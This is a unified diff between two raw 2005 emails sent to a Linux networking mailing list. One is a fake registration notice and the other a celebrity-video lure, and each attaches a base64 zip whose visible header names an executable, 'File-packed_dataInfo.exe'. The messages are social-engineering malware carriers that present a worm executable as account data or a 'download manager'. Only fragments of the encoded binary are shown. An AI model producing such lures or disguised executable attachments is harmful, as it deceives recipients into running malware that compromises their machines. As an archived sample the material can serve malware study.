@@ -1,29 +1,30 @@
-From: Admin@mail2togo.com
-Subject: Registration_Confirmation
-Date: Sat, 17 Dec 2005 18:05:00 GMT
-Message-ID: <9412.fceca52eabc9c6@hjfrgu.com>
+From: Admin@crivens.demon.nl
+Subject: Paris_Hilton_&_Nicole_Richie
+Date: Sat, 17 Dec 2005 18:57:15 GMT
+Message-ID: <d0b9d0c.bd5d4a4bb@crivens.demon.nl>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="======45ef05dfb5ca.bfbba9a69d"
+Content-Type: multipart/mixed; boundary="====3bab974275cb62.ac33d72"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: priv-mail@oss.sgi.com
+To: Z-Account5532@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---======45ef05dfb5ca.bfbba9a69d
+--====3bab974275cb62.ac33d72
 
-Account and Password Information are attached!
+The Simple Life:
 
+View Paris Hilton & Nicole Richie video clips , pictures & more ;)
+Download is free until Jan, 2006!
 
-***** Go to: http://www.mail2togo.com
-***** Email: postman@mail2togo.com
---======45ef05dfb5ca.bfbba9a69d
-Content-Type: application/octet-stream; name=reg_pass-data.zip
+Please use our Download manager.
+--====3bab974275cb62.ac33d72
+Content-Type: application/octet-stream; name=downloadm.zip
 Content-Transfer-Encoding: base64
-Content-Disposition: attachment; filename="reg_pass-data.zip"
+Content-Disposition: attachment; filename="downloadm.zip"
 
 UEsDBAoAAAAAAACQdjPMyus3XtgAAF7YAAAYAAAARmlsZS1wYWNrZWRfZGF0YUluZm8uZXhlTVqQ
 AAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -1000,4 +1001,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---======45ef05dfb5ca.bfbba9a69d--
+--====3bab974275cb62.ac33d72--
